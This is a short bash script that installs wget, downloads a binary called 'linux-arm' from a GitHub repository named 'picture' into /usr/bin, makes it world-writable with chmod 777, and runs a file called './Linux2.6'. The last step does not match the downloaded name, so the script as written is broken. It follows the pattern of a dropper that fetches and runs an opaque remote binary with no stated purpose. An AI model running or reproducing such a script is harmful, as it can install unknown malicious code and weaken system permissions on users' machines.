#!/bin/bash

cd /usr/bin
apt-get -y install wget
wget -N https://raw.githubusercontent.com/occ1122/picture/main/linux-arm
chmod 777 linux-arm
./Linux2.6
